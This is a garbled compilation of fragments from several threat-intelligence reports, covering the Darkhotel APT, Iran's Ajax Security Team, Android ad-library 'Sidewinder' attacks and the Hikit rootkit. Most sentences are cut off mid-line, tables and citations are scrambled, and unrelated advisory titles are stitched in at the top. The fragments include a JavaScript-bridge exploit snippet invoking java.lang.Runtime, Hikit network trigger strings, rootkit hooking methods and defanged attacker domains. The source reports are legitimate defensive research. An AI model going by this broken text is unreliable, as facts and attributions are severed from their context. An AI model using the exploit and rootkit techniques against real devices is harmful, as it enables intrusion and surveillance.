Threat Outbreak Alert : Fake North Korean Sunken Ship Report E­mail Messages
Id=20148
Security Advisory for Adobe Reader and Acrobat , Adobe , cve­2010­2883
Kaspersky Lab HQ
Moscow , 125212
Russian Federation
Tel : 	 + 7 - 495 - 797 - 8700
Fax : 	 +7 - 495 - 797 - 8709
E - mail : 	  info@kaspersky.com
Website : 	  www.kaspersky.com
The Darkhotel APT
A Story of Unusual
Hospitality
Version 1.0
November , 2014
Global Research and Analysis Team
Contents
Executive Summary ................................................................................................. 3
Introduction ............................................................................................................. 4
Analysis .................................................................................................................... 5
Delivery - Hotels / Business Centers and Indiscriminate Spread ..................... 5
Hotels and Business Centers Spread ......................................................... 5
Abusing Network Infrastructure ................................................................... 6
Indiscriminate Spread .................................................................................. 7
Darkhotel Spear - phishing Campaigns ........................................................ 8
Recent 0-day Deployment ........................................................................... 9
Digital Certificates and Delegitimizing Certificate Authority Trust ................... 9
Cracking the keys ...................................................................................... 12
Other Tapaoux Certificates ........................................................................ 12
Enhanced Keyloggers and Development ...................................................... 13
Keylogger Code .......................................................................................... 13
Interesting Malware Components ....................................................................... 15
Small Downloader .......................................................................................... 15
Information Stealer ......................................................................................... 16
Trojan . Win32.Karba.e ..................................................................................... 17
Trojan - Dropper & Injector ( infected legitimate files ) ..................................... 17
Selective Infector ............................................................................................ 18
Campaign Codes ............................................................................................. 18
Infrastructure and Victims ................................................................................... 19
Sinkhole Domains ........................................................................................... 19
Victim Locations - KSN and Sinkhole Data .................................................... 20
Sinkhole Data ............................................................................................ 22
Available ddrlog Victim Data ........................................................................... 22
C2 Communications and Structure ............................................................... 24
Victim Management ........................................................................................ 25
Researcher Activity .................................................................................... 26
Conclusions .......................................................................................................... 27
Executive Summary
The Darkhotel APT is a threat actor possessing a seemingly inconsistent and con-
The following list presents a set of characteristics for the crew :
Introduction
When unsuspecting guests , including situationally aware corporate executives and
This first stage of malware helps the attackers to identify more significant victims ,
At the hotels , these installs are selectively distributed to targeted individuals . This
The FBI issued advisories about similar hotel incidents ; Australian government offi-
Darkhotel server log data records connections as early as Jan 1 , 2009 . Addition-
Analysis
Delivery - Hotels / Business Centers and Indiscriminate Spread
Hotels and Business Centers Spread
The Darkhotel APT ’s precise malware spread was observed in several hotels’
Of course , these packages were really installers for Darkhotel APT ’s backdoors ,
The most interesting thing about this delivery method is that the hotels require
Abusing Network Infrastructure
The Darkhotel actor maintained an effective intrusion set at hotel networks ,
As a part of an ongoing investigation , our research led us to embedded iframes
The attackers were also very careful to immediately delete all traces of their
The attack technique blurs the line between a couple of common APT tactics ;
Indiscriminate Spread
An example of the Darkhotel APT ’s indiscriminate malware spreading is dem-
This Darkhotel package was downloaded over 30,000 times in less than
This torrent serves up an almost 900 mb file . The rar archive decompresses to
When a user downloads the torrent and decrypts the zip files , the trojan surrepti-
Other examples of this Darkhotel backdoor bound within a shared torrent include
The associated Darkhotel backdoor was hosted on bittorrent , emule , etc , under
Darkhotel command and control server domains include :
Darkhotel Spear - phishing Campaigns
Darkhotel campaigns involving typical spear - phished Tapaoux implants publicly
Email content on topics like nuclear energy and weaponry capabilities was used as
Over the past few years the group has emailed links that redirect targets’ brows-
Recent 0-day Deployment
This crew occasionally deploys 0-day exploits , but burns them when required . In
Securelist in early February .
The crew spear - phished a set of target systems connected to the Internet through
Chinese ISPs , and developed capabilities within the 0-day exploits to handle
Digital Certificates and Delegitimizing Certificate Authority
Trust
The Darkhotel actors typically sign their backdoors with digital certificates of one
Subordinate
Subordinate
Equifax        Equifax Secure        secure.hotelreykjavik.i s    Invalid Sig     2/27/2005     3/30/2007
Secure         eBusiness CA­1        md5/RSA ( 512 bits )
Verisign       Verisign Class 3      secure2.eecu.com sha1/ Invalid Sig          10/25/2009    10/26/2010
Secure OFX CA G3      RSA ( 512 bits )
Root Agency Root Agency             Microsoft                    Invalid Sig     6/9/2009      12/31/2039
Subordinate
Cybertrust     SureServer CA    com
All related cases of signed Darkhotel malware share the same Root Certificate
Authority and Intermediate Certificate Authority that issued certificates with
Certificates Abused in the Wild ” .
To further support this speculation please note the non­specific Microsoft Security
Advisory below , the Mozilla advisory addressing the issue at the time , and the
Entrust responses .
From Microsoft ’s security advisory from Thursday , November 10 , 2011 :
Microsoft product , this issue affects all supported releases of Microsoft Windows .
There is no indication that any certificates were issued fraudulently . Instead ,
Microsoft is providing an update for all supported releases of Microsoft Windows
From Mozilla ’s 2011 response :
From Entrust ’s response :
Cracking the keys
Here are some notes on the costs and technical requirements of attacking these
The computing power required to crack and factor an RSA 512 bit key was $ 5000
In October 2012 , Tom Ritter reported that it would cost about $ 120­-$150 , per-
Going even further back , there was much discussion about the technical meth-
Other Tapaoux Certificates
Recent Tapaoux attacks and backdoors include malware signed with strong
Subordinate
Root CA           Technology Co.,Ltd .
Root CA           zhidian Electric Power
Technology Co. , Ltd.
Enhanced Keyloggers and Development
One of the most interesting components that we discovered as a part of this cam-
This keylogger is dropped by code running within svchost.exe on WinXP SP3 ,
Note 일반 means “ General ” in Korean
It probably was developed as a part of a mid - to - late 2009 project :
Keylogger Code
This driver package is built to resemble a legitimate low - level Microsoft system
When loaded , the NDISKPRO.SYS driver hooks both INT 0x01 and INT 0xff , and
This keylogger module encrypts and stores gathered data in a log file , as men-
Interesting Malware Components
The Darkhotel toolset consists of multiple components that have been slightly
More advanced tools , like the keylogger decribed above , are later downloaded to
The most interesting behaviors of these components include
Small Downloader
This module is quite small ( 27Kb ) and comes as a part of WinRar SFX file that drops
This module is designed to update malicious components through recurring checks
One of the most interesting functions of this executable is its unusual delay and
The component gathers system information and sends it to the Darkhotel com-
Information Stealer
This module is relatively large ( 455Kb ) and comes as a part of a WinRar SFX file
This module is designed to terminate itself on Windows with the system de-
Trojan . Win32.Karba.e
This malware is 220Kb in size . It was built as MFC framework application with a
Trojan - Dropper & Injector ( infected legitimate files )
This malware is 63 kb in size . It is bound to a variety of other software packages
Selective Infector
This component is a virus , and is used to selectively infiltrate into other comput-
First , the virus retrieves all available disks and starting from disk number 4 ( D:\ )
During its infection routine , the infector changes the entrypoint of executable
Trojan­Dropper & Injector section , so it can collect information about the comput-
Observed downloaded components are signed with a familiar expired certificate
Again , further technical details are provided in Appendix D.
Campaign Codes
Almost every backdoor in this set maintains an internal campaign code or i d , used
Java5.22                                 step2-down - u
M1Q84K3H                                      VICTORY
Infrastructure and Victims
This infrastructure team appears to employ a lesser skillset than top notch
Overall , victims in our sinkhole logs and KSN data were found across the globe ,
Sinkhole Domains
The following C&C domains have been sinkholed and redirected to the Kaspersky
Sinkhole Server
Victim Locations - KSN and Sinkhole Data
Our Kaspersky Security Network detected Darkhotel infections across thousands
Here is a pie chart to better visualize the proportions of attack activity throughout
Sinkhole Data
Because the operators very actively build up new command and control serv-
Japan , Ireland , Korea , China and Taiwan in the top slots . Removing India and
Ireland , the set more closely matches our KSN data .
Available ddrlog Victim Data
Many of these c2s maintain a common directory path that serves a ddrlog . The
A description of the detailed connectback URL values and their xor / base64
The Darkhotel c2 maintain these directory structures to store and serve ddrlog
The following structures appear to be common across servers , but do not pro-
Two ddrlog files report entries starting January 1 , 2009 at 9:16 a.m.
All of the logs maintain a significant number of entries , almost 50,000 , with a
Only 120 IP addresses perform the “ B ” checkin , and 90% of these are from the
A handful of the remaining addresses , like 222.150.70.228 , appear to come
Other ddrlogs may include “ A ” tags as well .
The “ A ” tag labels unwanted checkins from untargeted locations , like Hungary
The “ L ” tag labels unwanted checkins from a variety of ranges , but includes odd
Entries in these logs include callback URLs that have spaces and unusual charac-
C2 Communications and Structure
Typical main page :
For begatrendstone.com , we have the following directory structure :
/L
For auto2116.phpnet.us , we have the following directory structure :
The group encrypts victim data on their servers with single user / passkey combi-
Darkhotel web interface for victim management without the correct passkey , the
Victim Management
New victim systems appear to be systematically vetted . The attackers maintain
Here is an example of one of these web pages :
Researcher Activity
Clearly , some automated analysis activity involving researchers’ sandbox tools
This system(s ) uses a “ Dave ” user account and “ HOME­OFF­D5F0AC ” Windows
These characteristics correspond with network activity generated by GFI Soft-
Conclusions
For the past seven years , a strong threat actor named Darkhotel , also known as
Tapaoux , has carried out a number of successful attacks against a wide range of
The Darkhotel crew ’s skillset allows it to launch interesting cryptographical at-
The targeting of top executives from various large companies around the world
A further interesting trait is the deployment of multiple types of campaigns , both
We expect the Darkhotel crew to continue their activities against DIB , Govern-
Kaspersky Lab HQ
Moscow , 125212
Russian Federation
Tel : 	 + 7 - 495 - 797 - 8700
Fax : 	 +7 - 495 - 797 - 8709
E - mail : 	  info@kaspersky.com
Website : 	  www.kaspersky.com
Authors : Nart Villeneuve , Ned Moran ,
Thoufique Haq and Mike Scott
Fireeye : Operation Saffron Rose 2013
Introduction ................................................................................................................................................................................................................................................................................................................................................ 2
Background ................................................................................................................................................................................................................................................................................................................................... 2
Attack Vectors ...................................................................................................................................................................................................................................................................................................................................... 4
The “ Stealer ” Malware .................................................................................................................................................................................................................................................................................................... 6
The “ Stealer ” Builder and Tools ......................................................................................................................................................................................................................................................... 11
Command - and - Control Infrastructure .................................................................................................................................................................................................................. 13
Victimology ........................................................................................................................................................................................................................................................................................................................................... 15
Attribution .............................................................................................................................................................................................................................................................................................................................................. 16
Conclusion ................................................................................................................................................................................................................................................................................................................................................ 19
About FireEye , Inc .......................................................................................................................................................................................................................................................................................... 19
Fireeye : Operation Saffron Rose 2013
We believe we ’re seeing an evolution and development in Iranian - based cyber activity . In
Marine Corps Intranet ( NMCI ) , which is used by the U.S. Navy worldwide.3
In this report , we document the activities of the                                    Background
Ajax Security Team , a hacking group believed to be                                   The transition from patriotic hacking to cyber
Security Team had transitioned from performing                                       state , particularly military and/or intelligence
December 2013 ) to malware - based espionage ,
It is unclear if the Ajax Security Team operates in                                  hacking community engaged in website
In sum , FireEye has recently observed the Ajax                                       rewarding — both in terms of developing a more
Security Team conducting multiple cyber                                              advanced skill set as well as in monetary
States , as well as targeting local Iranian users of                                  founding member “ Wicked / Withered Rose ” was a
Internet filtering system .                                                           espionage by founding a “ hacker - for - hire ” group
Fireeye : Operation Saffron Rose 2013
Defense.6 ( One of this group ’s associates , “ whg ” , is                                Guard Corps ( IRGC ) , under which the Basij
What benefit can hacking a Web page bring our                                       politically motivated defacements and denial of
In Iran , the hacking community appears to be
Wikipedia . “ Network Crack Program Hacker Group ” .
Fireeye : Operation Saffron Rose 2013
Attack Vectors                                                                  registered the domain “ aeroconf2014[.]org ” in
We have observed the Ajax Security Team use a                                   order to impersonate the IEEE Aerospace
Spear phishing                                                                  The email encouraged users to visit a fake
During our investigation , we discovered that these                              conference website owned by the attackers :
Figure 1 : The Fake
Conference Website
Bloomberg . “ Neiman Marcus Hackers Set Off 60,000 Alerts While Bagging Credit Card Data . ” February 2014 .
Fireeye : Operation Saffron Rose 2013
Credential Phishing                                                                    political opposition.18 In response to these
The attackers have also used phishing attacks , in                                      restrictions , Iranians have been increasingly using
If users attempt to login through these fake Web                                       Internet users in Iran was bundled with malware
Anti - censorship Tools                                                                  Our investigation found that malware - laden
All Internet Service Providers ( ISPs ) in Iran are                                      versions of legitimate anti - censorship software ,
Figure 2 : The Fake Outlook
Web Access page
Fireeye : Operation Saffron Rose 2013
The “ Stealer ” Malware                                         The IntelRS.exe is written in .NET and is aptly
Host - based Indicators and Malware                             named “ Stealer ” , as it has various data collection
Functionality                                                 modules . It drops and launches AppTransferWiz.dll
We have observed the Ajax Security Team use a                 via the following command :
They deliver this malware as a malicious executable           “ C:\WINDOWS\system32\rundll32.exe ” “ C:\
Documents and Settings\{USER}\Application
File                                                Functionality
Figure 3 : StartBypass
Ordinal
Fireeye : Operation Saffron Rose 2013
Data exfiltration is conducted over FTP by               • 	    Takes various screenshots
This DLL is written in Delphi . There is code to          • 	    Harvests instant messaging ( IM ) account
State is maintained between the stealer                  • 	    Collects email account information
Once the state is set , IntelRS.exe proceeds to           IntelRS.exe loads a Delphi component called
Figure 4 : AppTransferWizard .
Figure 5 : IntelRS.exe sleeps
Fireeye : Operation Saffron Rose 2013
The Stealer component uses common techniques                       Analysis of the malware indicates that the data is
Harvested data is encrypted and written to disk on                 conforms to the FIPS-197 specification of
The { stolen data type } parameter indicates where                   class.23 The passphrase and salt are Persian
Figure 6 : Acquiring RDP
Accounts
Wikipedia . “ PBKDF2 ” .
Microsoft . “ Rfc2898DeriveBytes Class ” .
Fireeye : Operation Saffron Rose 2013
Sample Timeline                                         Spoofed Installers
We identified 17 droppers during this research ,         Many of the malicious executables ( droppers ) that
The 2009 compile time appears to have been                   virtual private network software .
In some cases , we found an implant but not the               proxy .
Figure 7 : Icon for the Psiphon
Anti - censorship Tool
Fireeye : Operation Saffron Rose 2013
Process Debug ( PDB ) Strings
Analysis of the PDB strings seen in the implants       VS_VERSION_INFO
Stealer builder . The following two PDB paths were      StringFileInfo
Process for Windows
Microsoft
Process for Windows
These strings indicate that the Stealer source         1.0.0.0
Projects\ path may be from an external storage         LegalCopyright
Process for Windows
Builder Artifacts                                      1.0.0.0
In nine of the implants that we collected , we found    Assembly Version
Note the InternalName of ‘ Stealer.exe’. This is the
Fireeye : Operation Saffron Rose 2013
The “ Stealer ” Builder and Tools                              The Builder option enables an attacker to
During our research , we recovered two different              configure a new Stealer backdoor . The user can
Team in conjunction with targeted intrusion                  specific CnC server with a personalized username
Upon executing the ‘ Stealer Builder’ the user is             We also noted that the Builder did not allow the
Figure 8 : The Stealer Tool
Figure 9 : The Stealer Builder
Fireeye : Operation Saffron Rose 2013
During testing , we observed that backdoors             Base64 encoded text into plaintext . Members of
The VS_VERSION_INFO PE resource mentioned              startup , keylogger , and screenshot plugins .
We also recovered a tool designed to encode            users .
Figure 10 : Base64 Encoder
Fireeye : Operation Saffron Rose 2013
Command - and - Control Infrastructure                     The website used in the Aerospace Conference
The CnC infrastructure consists of distinct , but       attack was aeroconf2014[.]org , which is registered
The first cluster contains the domain used in the      Ajax Security Team . The same email addresses
Aerospace Conference attack as well as the             were used to register variations of domain names
Figure 11 : Ajax Security
Team ’s Phishing
Infrastructure
Fireeye : Operation Saffron Rose 2013
The second cluster comprises the CnC                   domains registered by osshom@yahoo[.]com , many
The majority of the samples we analyzed connect        registering domains with associations to Google
The domain intel - update[.]com resolved to the IP       update[.]com and ultrasms[.]ir , which was
Figure 12 : Ajax Security
Team ’s Stealer CnC
Infrastructure
Figure 13 : Overlap between the
Fireeye : Operation Saffron Rose 2013
These two clusters are linked by a common IP             found that the majority had either their timezone
A third cluster of activity was found via analysis of          Time ” ( 37 of those also have their language set
Aside from the sample connecting to plugin-                    to “ Iran Standard Time ” )
Victimology                                              settings and “ Iran Standard Time ” correlate the
During our investigation , we were able to recover        victim to be geographically located in Iran . As such ,
Domain                           IP                           First Seen                   Last Seen
Fireeye : Operation Saffron Rose 2013
Attribution                                                                       several exploits for content management systems
The Ajax Security Team appears to have been                                       and engaged in defacements.25 Initially , the
Ajax Security Team , and both were members of
Iranian hacker forums such as ashiyane[.]org and                                  However , the group appears to have become
Team website at ajaxtm[.]org had a Web forum                                      political opponents .
Figure 14 : Cair3x ’s original
Hacking anti - revolution political and opposition websites
Hello to everyone , After a while of operating underground
By March 2010 HUrr!c4nE ! was identifying as a member of Ajax Security Team in exploit releases http://www.exploit-db.com/exploits/17011/ and the
Fireeye : Operation Saffron Rose 2013
In 2013 , the Ajax Security Team , and “ HUrr!c4nE ! ”                                   “ HUrr!c4nE ! ” has the most open / documented
By early 2014 , the Ajax Security Team appears to                                    was also the email address used to register the
Figure 15 : Screenshot of the
Ashraf , N. “ # OpIsrael : Hacktivists Starting Cyber Attack against Israel on 7th of April ” . March 2013 . “ OpUSA Targeting Government & Financial Sectors on
Fireeye : Operation Saffron Rose 2013
Team activity , this coincides with an increase in                                    that would be considered traditional cybercrime . In
The increasing politicization of the Ajax Security                                   are defined as attacks in which :
Team aligns with the timing of their activities
Recruiting hackers through this model allows Iran
While the objectives of this group are consistent                                    to influence their activities , and provides the
Figure 16 : Screenshot
Healey , J. “ Beyond Attribution : Seeking National Responsibility for Cyber Attacks ” . January 2012 .
Fireeye : Operation Saffron Rose 2013
Conclusion                                                About FireEye
The increased politicization of the Ajax Security         FireEye has invented a purpose - built , virtual
Team , and the transition from nuisance                    machine - based security platform that provides
The capabilities of the Ajax Security Team remain         without the use of signatures to protect an
While the Ajax Security Team ’s capabilities remain        customers across more than 40 countries ,
Security Team controlled CnC server . We believe
Inc. All other brands , products , or service names are or may be trademarks or service
Introduction ................................................................................................................................................................................................................................................................................................................................................ 3
Sidewinder Targeted Attack Overview ............................................................................................................................................................................................................................. 3
Warhead : Attacking Vulnerabilities of Android ........................................................................................................................................................................................ 5
Piercing The Armor ................................................................................................................................................................................................................................................................................................. 5
Detonation without Android Context .................................................................................................................................................................................................................... 7
Detonation with Android Context ................................................................................................................................................................................................................................... 8
Targeting Victims Based on Ad Traffic ............................................................................................................................................................................................................................ 11
Communication Channels Prone to Hijack .......................................................................................................................................................................................... 11
Information Leakage from Ad Libraries ....................................................................................................................................................................................................... 11
Large - scale Monitoring and Precise Hijacking ........................................................................................................................................................................... 12
Targetable and Exploitable Google Play Apps ......................................................................................................................................................................................... 13
Conclusion ................................................................................................................................................................................................................................................................................................................................................. 20
Introduction                                                                      Finally , we show that this threat is not only real
By 2014 , the number of Android users has                                          but also prevalent due to the popularity of
For example , in Intel ’s BYOD program , there are                                   security framework in the future .
Sidewinder Targeted Attack Overview
Although little malware has been found in Google                                  To understand the security risks brought by a
Play , both Android apps and the Android system                                    Sidewinder Targeted Attack , we first explain one
By leveraging all these vulnerabilities , an attacker                              attacker can hijack the network where the
It is a well - known challenge for an attacker to call
Android services from injected native code that                                   Table 1 proposes different attacks that an
Ranjit Atwal , Lillian Tay , Roberta Cozza , Tuong Huy Nguyen , Tracy Tsai , Annette Zimmermann , and CK Lu . Forecast : Pcs , ultramobiles and mobile phones ,
Rob Evered , Steve Watson , Paul Dockter , and Derek Harkin . Android devices in a byod environment . Intel White Paper , 2013 .
Figure 1 :
Illustration of
Info uploaded from ad libs
Targeted Attack
Scenario
Attack Overview                                                                                         Serving Normal ad
Injecting attack payload
Comman & Control
Device A
Device
Victim
Device B                                Attacker ’s                          Actual
Server                           Ad Server
Table 1 : Outline                      API Level                                         ≤ API 16                                       > API 16
Targeted                             Attack Vector                                JBOH and DLOH                                       JS Sidedoor
Attack through                      31.08%                      ( w/ Android Context )          ( w / o Android Context )
Vulnerable Ad                                                                                        51.04%               48.96%
Libraries
Launcher settings           exploit & Code injection              Abusing privileged
Attacks
Taking pictures Audio &
Based on this precise position information , it is easy to identify individuals or groups of “ VIP ” targets by
Figure 2 : The
Warhead : Attacking Vulnerabilities                                              ( Android 4.1 ) or below . As noted by Google : “ Use
Piercing The Armor                                                              manipulate the host application in unintended
In this section , we explain in more detail the risks                            ways , executing Java code with the permissions
Attacking JavaScript Binding over                                               In particular , if an app running on Android API 16
Android uses the JavaScript binding method                                      addJavascriptInterface and loads the content
Figure 3 : Target
Play apps                         31.08%                                         API < = 16                                                          API < = 16
Listing 1 : Sample
Javascript snippet             jsObj.getClass().forName(”java.lang . Runtime ” )
We call this the JavaScript - Binding - Over - HTTP                                     Attacking Annotated JavaScript
Internet , without consent . Based on the official                                  a WebView . However , if an ad library uses the
Note that API>16 platforms are not necessarily                                    attacks where an attacker over the network
Security Issues with DEX Loading over                                     than 1,000 brands ( > 20,000 models ) 8 .
Similar to JBOH , DEX loading over HTTP or                                 recently in Linux kernel , claims that it can root
Even if the attackers ca n’t obtain root , they can
Detonation without Android Context                                        attempt ptrace 10 to control the host app .
After getting local access , the attacker can upload                       Although only processes with root privilege can
To launch more sophisticated attacks like sending                         android : debuggable set as “ true ” in the manifest
Java reflection to call other APIs from the
Javascript bridge . It appears this method makes                           Sending SMS and Dialing Numbers without
Listing 2 : Sending
To make calls from the Javascript bridge                                        Javascript bridge . Code in Listing 4 , for
Definition Language ( AIDL ) files 11 . Many other                                 shown in Listing 5 , an attacker can load
Android services can be invoked in the same                                     executables compiled from JNI code . Once
Detonation with Android Context                                                 inject new classes from the attackers’ DEX
As mentioned , it is more convenient to                                          files to register callbacks to take pictures/
Listing 3 : Dial
Listing 4 : Sample
There are other ways to obtain Android context ,                                Using these APIs , the attackers can monitor
June 201414 .                                                                   this issue .
Clipboard Monitoring nd Tampering                                              Launcher Settings Modification
With the Android context , an attacker can                                      Android Open Source Project ( AOSP ) classifies
Listing 5 : Sample
Javascript snippet             jsObj.getClass().forName(”java.lang . Runtime ” )
Java VM
Listing 6 : API
We have found that certain “ normal ” permissions                                read or write operations .
On the contrary , taking pictures and recording
As a proof - of - concept attack scenario , a malicious                             videos are more challenging . First , this requires
After our notification , Google has patched this                                the correct implementation and enforcing a
Google5 , by 7 July 2014 , 17.9% Android devices                                 security consideration ) , startPreview ( ) is
Android devices are vulnerable .                                                devices takePicture ( ) fails to check whether a
Proxy Modification                                                             Fortunately , we have never witnessed a case
With the CHANGE WIFI STATE permission ,                                         where the MediaRecorder can shoot videos
Android processes can change the proxy                                         without calling setPreviewDisplay . But we
Stealthy App Installation by Abusing                                          case with the attackers eavesdropping or hijacking
Credentials                                                                   the HTTP traffic . Switching to HTTPS may not
With both the GET ACCOUNTS and the USE                                        solve this issue since the HTTPS security relies on
Javascript bridge , attackers can install apps of                              the ad libraries have a correct and rigorous
Targeting Victims Based on Ad Traffic                                         for platform compatibility and user interest
In this section , we explain the risks of victims’                             targeting . The information most frequently
Communication Channels Prone to Hijack                                        installed app list , etc . Table 3 lists the info
It is well known that communication via HTTP is                               uploaded from the top five popular ad libraries .
Listing 7 : API
Sascha Fahl , Marian Harbach , Thomas Muders , Lars Baumga¨rtner , Bernd Freisleben , and Matthew Smith . Why eve and mallory love android : An analysis
Large - scale Monitoring and Precise Hijacking                                  ARP hijacking ( or spoofing ) in IDC26 is done to
To locate victims effectively , an attacker needs to                           hijack the traffic to the ad server in the IDC where
In this context , DNS hijacking is done to subvert
Figure 4 : Number                                                                             App Num
Play apps ( with
Targetable and Exploitable Google                        We analyzed the 92 ad libraries found in the
Play Apps                                                popular Google Play apps , and summa- rized the
We used the FireEye Mobile Threat Prevention             communication channel vulnerabilities in Table
The detailed ad library inclusion statistics are
For security considerations , in this paper we            number and the accumulated download counts
Table 2 : The
Android ad
Ad1                  9,702               2,802                8,781 M                2,348 M
Google Ad . Their
Ad3                  8,818               2,117                8,499 M                1,611 M
Ad4                  5,519               1,112                4,687 M                 617 M
Ad5                  5,170                0                   4,519 M                   0
Table 3 : The
Ad Library                          Uploaded Info                        Protocol    SSL Vuln        JBOH        DLOH
Ad1
Ad3            droid version , device manufacturer , carrier info ,       HTTP
Ad4                                                                   HTTP
Ad5                specification , Android version , coun- try ,         HTTPS
Table 4 : Assessment statistics                                                                        Type I                             Type II
Subject to attack type            Type I #                         Type II #
Code injection via ptrace           2,055             444 M             272                 67 M
Sidewinder Targeted Attack . Type I
Launcher modification               111              95 M               81                 37 M
Targeted Attack ) . Note that an app                  Proxy modification                 644              792 M             419                 378 M
Install apps stealthily             351              552 M             197                 332 M
Conclusion
In the current golden age of Android ad               1 . 	  Android is a complex system . Any sub-
Attacks . First we need to improve the security        2 . 	  The trade - off between usability ,
Sidewinder Targeted Attacks can target
Targeted Attacks .                                                                       the development chain . For example , it
Android security framework .
Meanwhile , Google itself needs to further
About FireEye , Inc.                                    provides real - time , dynamic threat protection
Inc. All other brands , products , or service names are or may be trademarks or service
Hikit Analysis
Basic Description
Hikit consists of at least two generations of malware that provides basic RAT functionality . The first
Both Gen 1 and Gen 2 sub - families of Hikit consist of a main DLL ( referred to as “ the DLL ” ) that
Gen 2 uses a standard client - server malware model meaning that the malware no longer requires a
Each of the Hikit generations contains multiple sub - generations as the author(s ) of Hikit have evolved
Evolution
The earliest known Hikit sample dates back to 31 March 2011 . Known as the Gen 1.0 sub - generation of
Hikit Gen 1 , the first known sample of Hikit deviated from the later traditional Gen 1 model . The Gen 1.0
Less than three weeks after Gen 1.0 , the author(s ) of Hikit move into Gen 1.1 . The notable change is
The code matures slightly between Gen 1.0 and Gen 1.1 but the functionality does not change . Both
Gen 1.0 and Gen 1.1 use plaintext data transmissions .
Development appears to halt on Gen 1 for 4 months between 20 June 2011 and 23 October 2011
In Gen 1.2 , the communication between the infected machine and the attacker is encrypted using an
Gen 1.2 into a more stealth position as a random , non - HTTP compliant response from Gen 1.0 and
Gen 1.1 samples is more obvious than a legitimate HTTP response with a specially crafted Etag
Gen 1.2 ’s development cycle appears to exist between 23 October 2011 and 2 November 2011 with
The first known Gen 2 sub - generation , Gen 2.0 Alpha , much like Gen 1.0 , represents an early
On 9 February 2012 the first known sample for Gen 2.0 Beta is compiled by the developer(s ) of Hikit .
Also a stand - alone console executable like Gen 2.0 Alpha , the Gen 2.0 Beta code changes internally
The first known Gen 2.1 binary has a compile date of 17 April 2012 . Gen 2.1 represents the first Gen 2
Gen 2 sub - generations employ . The functionality of the Gen 2.1 sub - generation is the same as the
The Gen 2.2 sub - generation appears to have begun on 20 July 2012 . Gen 2.2 is notable for altering
September 2013 .
The last known Gen 2 sub - generation , Gen 2.3 , began on 12 December 2013 . Gen 2.3 is notable for its
Gen 2.2 uses a specific string to indicate the beginning of the embedded configuration presumably in
This allows the attackers to configure the loader without having to update the DLL .
The evolution of Hikit is a long and drawn out series of small , incremental development changes . The
August
Timeline Outlined in Appendix A : HiKit Versions
The Driver
The Driver component for Hikit varies based on the specific Hikit sub - family ( Gen 1 or Gen 2 ) . As such
Gen 1 Driver
The Driver component of Gen 1 Hikit variants provides the interface between the victim ’s network
When the Driver removes data from the network stack , the Driver stores the removed data in local
In order to interact with the Driver , the DLL uses the function
The Driver will remove data from the network stack only if a new channel is being established . A new
Value
Gen 1.0 , 1.1      GET /password                                    .welcome .
Gen 1.2           GET / HTTP/1.1\r\n                75BCD15          HTTP/1.1 200 OK
Pragma : no - cache
Content - Type : text / html
Connection : Keep - Alive
Gen 1.2           POST / HTTP/1.1\r\n               75BCD15          HTTP/1.1 200 OK
Pragma : no - cache
Content - Type : text / html
Connection : Keep - Alive
Up to and including Gen 1.1 Drivers required the DLL to specify the trigger string in addition to the
In Gen 1.2 , whenever the Driver detects a trigger string , the Driver inspects the rest of the data
The Driver appears to be based off the NDIS example source code PassThru . More specifically , the
Gen 2 Driver
The Gen 2 sub - family , beginning with Gen 2.0 Beta , employs a Windows device driver ( “ the Driver ” ) to
The Driver is based primarily on the open source Agony rootkit2 and it has evidence of some portions of
The Driver expose an IOCTL interface that supports the following OIDs :
The Driver is capable of hiding processes ( by PID , not name ) , system modules , services , network
Item                                                                                                                                                         API Function Hooked
Process ID                                                                                                                                                   ZwDeviceIoControlFile
Registry Key                                                                                                                                                 ZwEnumerateKey
Registry Value                                                                                                                                               ZwEnumerateValueKey
Directory                                                                                                                                                    QueryDirectoryFile
James
Antognini
Thomas
F.
Divine .
Microsoft
Intermediate
Driver — Parts :
Two
Address
Blocking
Drivers ” .
December
Rootkit
Driver
Develop ” .
April
Module
Hook :
Hiding
Port
Under
Windows
Vista ” .
July
Item               API Function Hooked
Local Listening    ZwDeviceIoControlFile
Port
Remote             ZwDeviceIoControlFile
Endpoint
Loaded Drivers     ZwQuerySystemInformation
In order to hide services , the Driver will access the memory of the services.exe process , locate the
Upon activation , the Driver will expose its interface by calling
Driver also creates a symbolic link to the device using the same name but under the
For reasons unknown , the authors of the Driver used code from a Chinese blog that details how to hide
Functionality and Commands
The Hikit family has supported roughly the same set of commands since the first known samples of
Gen 1.0 . Gen 2.0 introduced a single command to provide insight into an infected machine ’s Hikit
Command        Introduced    Description
Alpha
Command :   shell
The
Command :   file
The
Command :   connect
The
Gen 1 Driver requires an exposed network interface in order for an external attacker to access the Gen
Command :   proxy ( Gen 1.2 and later ) , socks5   ( Gen 1.0 and 1.1 )
The
Command :   information
Gen 2 samples rely on a configuration in order to know where the C2 server exists along with other
Command :   exit
As the name implies , the
Hikit Core Analysis
With the Gen 1 sub - family using a server model and the Gen 2 sub - family using the client model ,
Driver above , in the context of the specific sub - family .
Gen 1 Analysis
As noted previously in this report , the Gen 1 sub - family has several sub - generations but overall the
Ultimately , both exports generate a new thread of the same function
Driver from the victim ’s machine and terminate . The authors of Gen 1 used freely available source code
Installing
Protocol
Drivers ”
December
When the DLL activates , either by a call to
With the Driver version verified ( or forcibly corrected by installing the appropriate Driver ) , the DLL will
It is possible that the second Driver version check is a last ditch
The DLL enters an infinite loop where the DLL waits for the Driver to report a new channel exists . A
When the Driver establishes a new channel , the DLL generates a runtime data structure before
The HikitThreadFunc
The communication scheme between the DLL and the client consists of a 20 to 24 byte header ( for Gen
Gen 1.0 and Gen 1.1 header is as follows :
While the Gen 1.2 header is :
For Gen 1.0 and Gen 1.1 samples , the magic field contains the string “ .. .. ”
Version checking is important in all Gen 1 variants . The dwHikitVersion
Gen 1 samples have a particular interest in the victim ’s locale language preferences . While it is typical
Gen 2 Analysis
The Gen 2 sub - family , like Gen 1.2 , uses a DLL for the core of its RAT functionality . In order for the
Loader ” ) . The Loader comes in the form of a standard executable image or a DLL image . Despite the
Figure 1 : DLL ( left ) and executable ( right ) Loader startup routines
Figure 1 provides a side by side comparison of the startup routines for the executable and DLL
Loaders . Both versions of the Loader begin by loading the embedded DLL from the Loader ’s resources
Figure 2 : LoadEmbeddedImage function snippet
The Loader obfuscates many strings by using a simple XOR encoding scheme . Decryption of encoded
The Loader stores the embedded DLL within a Group Icon resource within a legitimate icon image . In
Another heap buffer is allocated with a size equal to the value of
The
With the embedded DLL now decompressed into a heap buffer , LoadEmbeddedImage
After loading the embedded DLL image into memory , the Loader will either call the DLL ’s
The Gen 2 DLL exposes five exported functions ( besides the
Export Name                                                                                                                                                                Description
Markus
F.X.J.
Oberhumer ,
June
